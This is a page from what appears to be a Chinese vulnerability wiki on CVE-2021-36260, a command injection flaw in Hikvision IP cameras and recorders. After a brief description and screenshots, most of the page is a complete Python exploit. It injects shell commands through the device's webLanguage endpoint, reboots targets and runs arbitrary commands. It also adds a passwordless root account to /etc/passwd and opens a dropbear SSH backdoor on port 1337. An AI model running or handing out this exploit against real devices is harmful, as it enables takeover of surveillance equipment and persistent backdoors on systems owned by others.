<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/IOT%E5%AE%89%E5%85%A8/HIKVISION/HIKVISION%20DSIDSIPC%20%E7%AD%89%E8%AE%BE%E5%A4%87%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-36260/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>HIKVISION DS/IDS/IPC 等设备 远程命令执行漏洞 CVE-2021-36260 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "HIKVISION DS/IDS/IPC \u7b49\u8bbe\u5907 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CVE-2021-36260", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
              {title: "\u6f0f\u6d1ePOC", url: "#poc" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../HIKVISION%20iVMS-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20download%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../HIKVISION%20iVMS-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20download%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        HIKVISION iVMS-8700综合安防管理平台 download 任意文件下载漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../H3C/H3C%20SecPath%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20sys_dia_data_check%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../H3C/H3C%20SecPath%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20sys_dia_data_check%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        H3C SecPath下一代防火墙 sys_dia_data_check 任意文件下载漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="hikvision-dsidsipc-cve-2021-36260">HIKVISION DS/IDS/IPC 等设备 远程命令执行漏洞 CVE-2021-36260<a class="headerlink" href="#hikvision-dsidsipc-cve-2021-36260" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>海康威视部分产品中的web模块存在一个命令注入漏洞，由于对输入参数校验不充分，攻击者可以发送带有恶意命令的报文到受影响设备，成功利用此漏洞可以导致命令执行。海康威视已发布版本修复该漏洞</p>
<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p><img alt="img" src="../../../.vuepress/public/img/1636440207154-391ffa57-e7df-43d7-99bd-698e16c82009-20220314132135600.png" /></p>
<p><img alt="img" src="../../../.vuepress/public/img/1636440217967-a684e549-f12a-458e-a9f9-730cf2b9aae1-20220314132135704.png" /></p>
<p><img alt="img" src="../../../.vuepress/public/img/1636440225690-efe1f7a2-b236-4547-9fec-1fcba1f9b7ac-20220314132135762.png" /></p>
<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<ul>
<li>✅"671-1e0-587ec4a1"</li>
</ul>
<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p>登录页面</p>
<p><img alt="img" src="../../../.vuepress/public/img/1636440258216-48d3dfeb-e847-462d-81c0-afbc6e4a4bb3-20220314132135952.png" /></p>
<p>使用EXP命令执行</p>
<p><img alt="img" src="../../../.vuepress/public/img/1636440290269-a565a0d9-4abe-45ce-b8a6-75d2d355b252-20220314132135536.png" /></p>
<h2 id="poc">漏洞POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="x"># Exploit Title: Hikvision Web Server Build 210702 - Command Injection</span>
<span class="x"># Exploit Author: bashis</span>
<span class="x"># Vendor Homepage: https://www.hikvision.com/</span>
<span class="x"># Version: 1.0</span>
<span class="x"># CVE: CVE-2021-36260</span>
<span class="x"># Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html</span>

<span class="x"># All credit to Watchful_IP</span>

<span class="x">#!/usr/bin/env python3</span>

<span class="x">&quot;&quot;&quot;</span>
<span class="x">Note:</span>
<span class="x">1)  This code will _not_ verify if remote is Hikvision device or not.</span>
<span class="x">2)  Most of my interest in this code has been concentrated on how to</span>
<span class="x">    reliably detect vulnerable and/or exploitable devices.</span>
<span class="x">    Some devices are easy to detect, verify and exploit the vulnerability,</span>
<span class="x">    other devices may be vulnerable but not so easy to verify and exploit.</span>
<span class="x">    I think the combined verification code should have very high accuracy.</span>
<span class="x">3)  &#39;safe check&#39; (--check) will try write and read for verification</span>
<span class="x">    &#39;unsafe check&#39; (--reboot) will try reboot the device for verification</span>

<span class="x">[Examples]</span>
<span class="x">Safe vulnerability/verify check:</span>
<span class="x">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check</span>

<span class="x">Safe and unsafe vulnerability/verify check:</span>
<span class="x">(will only use &#39;unsafe check&#39; if not verified with &#39;safe check&#39;)</span>
<span class="x">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check --reboot</span>

<span class="x">Unsafe vulnerability/verify check:</span>
<span class="x">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --reboot</span>

<span class="x">Launch and connect to SSH shell:</span>
<span class="x">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --shell</span>

<span class="x">Execute command:</span>
<span class="x">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd &quot;ls -l&quot;</span>

<span class="x">Execute blind command:</span>
<span class="x">    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd_blind &quot;reboot&quot;</span>

<span class="x">$./CVE-2021-36260.py -h</span>
<span class="x">[*] Hikvision CVE-2021-36260</span>
<span class="x">[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)</span>
<span class="x">usage: CVE-2021-36260.py [-h] --rhost RHOST [--rport RPORT] [--check]</span>
<span class="x">                         [--reboot] [--shell] [--cmd CMD]</span>
<span class="x">                         [--cmd_blind CMD_BLIND] [--noverify]</span>
<span class="x">                         [--proto {http,https}]</span>

<span class="x">optional arguments:</span>
<span class="x">  -h, --help            show this help message and exit</span>
<span class="x">  --rhost RHOST         Remote Target Address (IP/FQDN)</span>
<span class="x">  --rport RPORT         Remote Target Port</span>
<span class="x">  --check               Check if vulnerable</span>
<span class="x">  --reboot              Reboot if vulnerable</span>
<span class="x">  --shell               Launch SSH shell</span>
<span class="x">  --cmd CMD             execute cmd (i.e: &quot;ls -l&quot;)</span>
<span class="x">  --cmd_blind CMD_BLIND</span>
<span class="x">                        execute blind cmd (i.e: &quot;reboot&quot;)</span>
<span class="x">  --noverify            Do not verify if vulnerable</span>
<span class="x">  --proto {http,https}  Protocol used</span>
<span class="x">$</span>
<span class="x">&quot;&quot;&quot;</span>

<span class="x">import os</span>
<span class="x">import argparse</span>
<span class="x">import time</span>

<span class="x">import requests</span>
<span class="x">from requests import packages</span>
<span class="x">from requests.packages import urllib3</span>
<span class="x">from requests.packages.urllib3 import exceptions</span>


<span class="x">class Http(object):</span>
<span class="x">    def __init__(self, rhost, rport, proto, timeout=60):</span>
<span class="x">        super(Http, self).__init__()</span>

<span class="x">        self.rhost = rhost</span>
<span class="x">        self.rport = rport</span>
<span class="x">        self.proto = proto</span>
<span class="x">        self.timeout = timeout</span>

<span class="x">        self.remote = None</span>
<span class="x">        self.uri = None</span>

<span class="x">        &quot;&quot;&quot; Most devices will use self-signed certificates, suppress any warnings &quot;&quot;&quot;</span>
<span class="x">        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)</span>

<span class="x">        self.remote = requests.Session()</span>

<span class="x">        self._init_uri()</span>

<span class="x">        self.remote.headers.update({</span>
<span class="x">            &#39;Host&#39;: f&#39;{self.rhost}:{self.rport}&#39;,</span>
<span class="x">            &#39;Accept&#39;: &#39;*/*&#39;,</span>
<span class="x">            &#39;X-Requested-With&#39;: &#39;XMLHttpRequest&#39;,</span>
<span class="x">            &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded; charset=UTF-8&#39;,</span>
<span class="x">            &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,</span>
<span class="x">            &#39;Accept-Language&#39;: &#39;en-US,en;q=0.9,sv;q=0.8&#39;,</span>
<span class="x">        })</span>
<span class="x">        &quot;&quot;&quot;</span>
<span class="x">        self.remote.proxies.update({</span>
<span class="x">            # &#39;http&#39;: &#39;http://127.0.0.1:8080&#39;,</span>
<span class="x">        })</span>
<span class="x">        &quot;&quot;&quot;</span>

<span class="x">    def send(self, url=None, query_args=None, timeout=5):</span>

<span class="x">        if query_args:</span>
<span class="x">            &quot;&quot;&quot;Some devices can handle more, others less, 22 bytes seems like a good compromise&quot;&quot;&quot;</span>
<span class="x">            if len(query_args) &gt; 22:</span>
<span class="x">                print(f&#39;[!] Error: Command &quot;{query_args}&quot; to long ({len(query_args)})&#39;)</span>
<span class="x">                return None</span>

<span class="x">        &quot;&quot;&quot;This weird code will try automatically switch between http/https</span>
<span class="x">        and update Host</span>
<span class="x">        &quot;&quot;&quot;</span>
<span class="x">        try:</span>
<span class="x">            if url and not query_args:</span>
<span class="x">                return self.get(url, timeout)</span>
<span class="x">            else:</span>
<span class="x">                data = self.put(&#39;/SDK/webLanguage&#39;, query_args, timeout)</span>
<span class="x">        except requests.exceptions.ConnectionError:</span>
<span class="x">            self.proto = &#39;https&#39; if self.proto == &#39;http&#39; else &#39;https&#39;</span>
<span class="x">            self._init_uri()</span>
<span class="x">            try:</span>
<span class="x">                if url and not query_args:</span>
<span class="x">                    return self.get(url, timeout)</span>
<span class="x">                else:</span>
<span class="x">                    data = self.put(&#39;/SDK/webLanguage&#39;, query_args, timeout)</span>
<span class="x">            except requests.exceptions.ConnectionError:</span>
<span class="x">                return None</span>
<span class="x">        except requests.exceptions.RequestException:</span>
<span class="x">            return None</span>
<span class="x">        except KeyboardInterrupt:</span>
<span class="x">            return None</span>

<span class="x">        &quot;&quot;&quot;302 when requesting http on https enabled device&quot;&quot;&quot;</span>

<span class="x">        if data.status_code == 302:</span>
<span class="x">            redirect = data.headers.get(&#39;Location&#39;)</span>
<span class="x">            self.uri = redirect[:redirect.rfind(&#39;/&#39;)]</span>
<span class="x">            self._update_host()</span>
<span class="x">            if url and not query_args:</span>
<span class="x">                return self.get(url, timeout)</span>
<span class="x">            else:</span>
<span class="x">                data = self.put(&#39;/SDK/webLanguage&#39;, query_args, timeout)</span>

<span class="x">        return data</span>

<span class="x">    def _update_host(self):</span>
<span class="x">        if not self.remote.headers.get(&#39;Host&#39;) == self.uri[self.uri.rfind(&#39;://&#39;) + 3:]:</span>
<span class="x">            self.remote.headers.update({</span>
<span class="x">                &#39;Host&#39;: self.uri[self.uri.rfind(&#39;://&#39;) + 3:],</span>
<span class="x">            })</span>

<span class="x">    def _init_uri(self):</span>
<span class="x">        self.uri = &#39;{proto}://{rhost}:{rport}&#39;.format(proto=self.proto, rhost=self.rhost, rport=str(self.rport))</span>

<span class="x">    def put(self, url, query_args, timeout):</span>
<span class="x">        &quot;&quot;&quot;Command injection in the &lt;language&gt; tag&quot;&quot;&quot;</span>
<span class="x">        query_args = &#39;</span><span class="cp">&lt;?</span><span class="nx">xml</span> <span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span> <span class="nx">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="cp">?&gt;</span><span class="x">&#39; \</span>
<span class="x">                     f&#39;&lt;language&gt;$({query_args})&lt;/language&gt;&#39;</span>
<span class="x">        return self.remote.put(self.uri + url, data=query_args, verify=False, allow_redirects=False, timeout=timeout)</span>

<span class="x">    def get(self, url, timeout):</span>
<span class="x">        return self.remote.get(self.uri + url, verify=False, allow_redirects=False, timeout=timeout)</span>


<span class="x">def check(remote, args):</span>
<span class="x">    &quot;&quot;&quot;</span>
<span class="x">    status_code == 200 (OK);</span>
<span class="x">        Verified vulnerable and exploitable</span>
<span class="x">    status_code == 500 (Internal Server Error);</span>
<span class="x">        Device may be vulnerable, but most likely not</span>
<span class="x">        The SDK webLanguage tag is there, but generate status_code 500 when language not found</span>
<span class="x">        I.e. Exist: &lt;language&gt;en&lt;/language&gt; (200), not exist: &lt;language&gt;EN&lt;/language&gt; (500)</span>
<span class="x">        (Issue: Could also be other directory than &#39;webLib&#39;, r/o FS etc...)</span>
<span class="x">    status_code == 401 (Unauthorized);</span>
<span class="x">        Defiantly not vulnerable</span>
<span class="x">    &quot;&quot;&quot;</span>
<span class="x">    if args.noverify:</span>
<span class="x">        print(f&#39;[*] Not verifying remote &quot;{args.rhost}:{args.rport}&quot;&#39;)</span>
<span class="x">        return True</span>

<span class="x">    print(f&#39;[*] Checking remote &quot;{args.rhost}:{args.rport}&quot;&#39;)</span>

<span class="x">    data = remote.send(url=&#39;/&#39;, query_args=None)</span>
<span class="x">    if data is None:</span>
<span class="x">        print(f&#39;[-] Cannot establish connection to &quot;{args.rhost}:{args.rport}&quot;&#39;)</span>
<span class="x">        return None</span>
<span class="x">    print(&#39;[i] ETag:&#39;, data.headers.get(&#39;ETag&#39;))</span>

<span class="x">    data = remote.send(query_args=&#39;&gt;webLib/c&#39;)</span>
<span class="x">    if data is None or data.status_code == 404:</span>
<span class="x">        print(f&#39;[-] &quot;{args.rhost}:{args.rport}&quot; do not looks like Hikvision&#39;)</span>
<span class="x">        return False</span>
<span class="x">    status_code = data.status_code</span>

<span class="x">    data = remote.send(url=&#39;/c&#39;, query_args=None)</span>
<span class="x">    if not data.status_code == 200:</span>
<span class="x">        &quot;&quot;&quot;We could not verify command injection&quot;&quot;&quot;</span>
<span class="x">        if status_code == 500:</span>
<span class="x">            print(f&#39;[-] Could not verify if vulnerable (Code: {status_code})&#39;)</span>
<span class="x">            if args.reboot:</span>
<span class="x">                return check_reboot(remote, args)</span>
<span class="x">        else:</span>
<span class="x">            print(f&#39;[+] Remote is not vulnerable (Code: {status_code})&#39;)</span>
<span class="x">        return False</span>

<span class="x">    print(&#39;[!] Remote is verified exploitable&#39;)</span>
<span class="x">    return True</span>


<span class="x">def check_reboot(remote, args):</span>
<span class="x">    &quot;&quot;&quot;</span>
<span class="x">    We sending &#39;reboot&#39;, wait 2 sec, then checking with GET request.</span>
<span class="x">    - if there is data returned, we can assume remote is not vulnerable.</span>
<span class="x">    - If there is no connection or data returned, we can assume remote is vulnerable.</span>
<span class="x">    &quot;&quot;&quot;</span>
<span class="x">    if args.check:</span>
<span class="x">        print(&#39;[i] Checking if vulnerable with &quot;reboot&quot;&#39;)</span>
<span class="x">    else:</span>
<span class="x">        print(f&#39;[*] Checking remote &quot;{args.rhost}:{args.rport}&quot; with &quot;reboot&quot;&#39;)</span>
<span class="x">    remote.send(query_args=&#39;reboot&#39;)</span>
<span class="x">    time.sleep(2)</span>
<span class="x">    if not remote.send(url=&#39;/&#39;, query_args=None):</span>
<span class="x">        print(&#39;[!] Remote is vulnerable&#39;)</span>
<span class="x">        return True</span>
<span class="x">    else:</span>
<span class="x">        print(&#39;[+] Remote is not vulnerable&#39;)</span>
<span class="x">        return False</span>


<span class="x">def cmd(remote, args):</span>
<span class="x">    if not check(remote, args):</span>
<span class="x">        return False</span>
<span class="x">    data = remote.send(query_args=f&#39;{args.cmd}&gt;webLib/x&#39;)</span>
<span class="x">    if data is None:</span>
<span class="x">        return False</span>

<span class="x">    data = remote.send(url=&#39;/x&#39;, query_args=None)</span>
<span class="x">    if data is None or not data.status_code == 200:</span>
<span class="x">        print(f&#39;[!] Error execute cmd &quot;{args.cmd}&quot;&#39;)</span>
<span class="x">        return False</span>
<span class="x">    print(data.text)</span>
<span class="x">    return True</span>


<span class="x">def cmd_blind(remote, args):</span>
<span class="x">    &quot;&quot;&quot;</span>
<span class="x">    Blind command injection</span>
<span class="x">    &quot;&quot;&quot;</span>
<span class="x">    if not check(remote, args):</span>
<span class="x">        return False</span>
<span class="x">    data = remote.send(query_args=f&#39;{args.cmd_blind}&#39;)</span>
<span class="x">    if data is None or not data.status_code == 500:</span>
<span class="x">        print(f&#39;[-] Error execute cmd &quot;{args.cmd_blind}&quot;&#39;)</span>
<span class="x">        return False</span>
<span class="x">    print(f&#39;[i] Try execute blind cmd &quot;{args.cmd_blind}&quot;&#39;)</span>
<span class="x">    return True</span>


<span class="x">def shell(remote, args):</span>
<span class="x">    if not check(remote, args):</span>
<span class="x">        return False</span>
<span class="x">    data = remote.send(url=&#39;/N&#39;, query_args=None)</span>

<span class="x">    if data.status_code == 404:</span>
<span class="x">        print(f&#39;[i] Remote &quot;{args.rhost}&quot; not pwned, pwning now!&#39;)</span>
<span class="x">        data = remote.send(query_args=&#39;echo -n P::0:0:W&gt;N&#39;)</span>
<span class="x">        if data.status_code == 401:</span>
<span class="x">            print(data.headers)</span>
<span class="x">            print(data.text)</span>
<span class="x">            return False</span>
<span class="x">        remote.send(query_args=&#39;echo :/:/bin/sh&gt;&gt;N&#39;)</span>
<span class="x">        remote.send(query_args=&#39;cat N&gt;&gt;/etc/passwd&#39;)</span>
<span class="x">        remote.send(query_args=&#39;dropbear -R -B -p 1337&#39;)</span>
<span class="x">        remote.send(query_args=&#39;cat N&gt;webLib/N&#39;)</span>
<span class="x">    else:</span>
<span class="x">        print(f&#39;[i] Remote &quot;{args.rhost}&quot; already pwned&#39;)</span>

<span class="x">    print(f&#39;[*] Trying SSH to {args.rhost} on port 1337&#39;)</span>
<span class="x">    os.system(f&#39;stty echo; stty iexten; stty icanon; \</span>
<span class="x">    ssh -o StrictHostKeyChecking=no -o LogLevel=error -o UserKnownHostsFile=/dev/null \</span>
<span class="x">    P@{args.rhost} -p 1337&#39;)</span>


<span class="x">def main():</span>
<span class="x">    print(&#39;[*] Hikvision CVE-2021-36260\n[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)&#39;)</span>

<span class="x">    parser = argparse.ArgumentParser()</span>
<span class="x">    parser.add_argument(&#39;--rhost&#39;, required=True, type=str, default=None, help=&#39;Remote Target Address (IP/FQDN)&#39;)</span>
<span class="x">    parser.add_argument(&#39;--rport&#39;, required=False, type=int, default=80, help=&#39;Remote Target Port&#39;)</span>
<span class="x">    parser.add_argument(&#39;--check&#39;, required=False, default=False, action=&#39;store_true&#39;, help=&#39;Check if vulnerable&#39;)</span>
<span class="x">    parser.add_argument(&#39;--reboot&#39;, required=False, default=False, action=&#39;store_true&#39;, help=&#39;Reboot if vulnerable&#39;)</span>
<span class="x">    parser.add_argument(&#39;--shell&#39;, required=False, default=False, action=&#39;store_true&#39;, help=&#39;Launch SSH shell&#39;)</span>
<span class="x">    parser.add_argument(&#39;--cmd&#39;, required=False, type=str, default=None, help=&#39;execute cmd (i.e: &quot;ls -l&quot;)&#39;)</span>
<span class="x">    parser.add_argument(&#39;--cmd_blind&#39;, required=False, type=str, default=None, help=&#39;execute blind cmd (i.e: &quot;reboot&quot;)&#39;)</span>
<span class="x">    parser.add_argument(</span>
<span class="x">        &#39;--noverify&#39;, required=False, default=False, action=&#39;store_true&#39;, help=&#39;Do not verify if vulnerable&#39;</span>
<span class="x">    )</span>
<span class="x">    parser.add_argument(</span>
<span class="x">        &#39;--proto&#39;, required=False, type=str, choices=[&#39;http&#39;, &#39;https&#39;], default=&#39;http&#39;, help=&#39;Protocol used&#39;</span>
<span class="x">    )</span>
<span class="x">    args = parser.parse_args()</span>

<span class="x">    remote = Http(args.rhost, args.rport, args.proto)</span>

<span class="x">    try:</span>
<span class="x">        if args.shell:</span>
<span class="x">            shell(remote, args)</span>
<span class="x">        elif args.cmd:</span>
<span class="x">            cmd(remote, args)</span>
<span class="x">        elif args.cmd_blind:</span>
<span class="x">            cmd_blind(remote, args)</span>
<span class="x">        elif args.check:</span>
<span class="x">            check(remote, args)</span>
<span class="x">        elif args.reboot:</span>
<span class="x">            check_reboot(remote, args)</span>
<span class="x">        else:</span>
<span class="x">            parser.parse_args([&#39;-h&#39;])</span>
<span class="x">    except KeyboardInterrupt:</span>
<span class="x">        return False</span>


<span class="x">if __name__ == &#39;__main__&#39;:</span>
<span class="x">    main()</span>
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../HIKVISION%20iVMS-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20download%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../HIKVISION%20iVMS-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20download%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        HIKVISION iVMS-8700综合安防管理平台 download 任意文件下载漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../H3C/H3C%20SecPath%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20sys_dia_data_check%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../H3C/H3C%20SecPath%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20sys_dia_data_check%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        H3C SecPath下一代防火墙 sys_dia_data_check 任意文件下载漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>